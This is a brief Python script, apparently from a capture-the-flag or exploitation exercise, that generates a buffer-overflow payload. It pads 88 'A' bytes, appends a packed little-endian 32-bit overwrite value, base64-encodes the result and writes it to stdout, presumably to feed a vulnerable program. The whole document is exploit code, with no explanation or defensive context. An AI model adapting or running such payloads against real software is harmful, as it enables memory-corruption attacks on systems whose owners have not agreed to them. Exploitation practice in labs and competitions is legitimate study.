
import sys
import struct
import base64

buf = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
buf += struct.pack('<I', 1781408246)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
